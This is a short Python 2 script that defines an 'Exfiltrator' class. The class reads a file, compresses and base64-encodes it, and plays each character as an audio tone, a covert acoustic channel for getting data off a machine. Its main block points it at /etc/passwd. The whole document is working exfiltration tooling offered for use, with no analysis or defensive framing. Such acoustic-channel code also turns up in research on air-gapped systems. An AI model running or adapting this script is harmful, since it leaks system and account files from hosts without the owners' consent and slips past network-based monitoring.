#!/usr/bin/python
from __future__ import division  # Avoid division problems in Python 2
import sys
import math
import zlib
import base64
import pyaudio


PyAudio = pyaudio.PyAudio
BITRATE = 14400
RATE = 16000


class Exfiltrator:
    def __init__(self, file_path):
        self.file_path = file_path

        self.PyAudio = PyAudio()
        self.streamer = self.PyAudio.open(
            format=self.PyAudio.get_format_from_width(1),
            channels=1,
            rate=BITRATE,
            output=True,
        )

        # WAVE = 1000

    def _read_file(self):
        try:
            f = open(self.file_path, "rb")
            tones = base64.b64encode(zlib.compress(f.read()))
            f.close()
            return tones
        except IOError, e:
            sys.stdout.write(
                "[!]\tError reading file '%s'.\n%s.\n" % (self.file_path, e)
            )
            raise

    def _close(self):
        self.streamer.stop_stream()
        self.streamer.close()
        self.PyAudio.terminate()

    def _play_tones(self, tones):
        i = 0
        for tone in tones:
            i += 1
            freq = ord(tone) * 10
            data = "".join(
                [
                    chr(int(math.sin(x / ((BITRATE / freq) / math.pi)) * 127 + 128))
                    for x in xrange(BITRATE)
                ]
            )[:256]
            self.streamer.write(data)
            if i % 10 == 0:
                sys.stdout.write("Played %s Bytes.\n" % i)
        sys.stdout.write("Completed playing %s tones.\n" % i)
        return True

    def exfil(self):
        tones = self._read_file()
        sys.stdout.write(
            "File '%s' is %s bytes after encoding.\n" % (self.file_path, len(tones))
        )
        self._play_tones(tones)
        self._close()


if __name__ == "__main__":
    audExf = Exfiltrator(file_path="/etc/passwd")
    audExf.exfil()
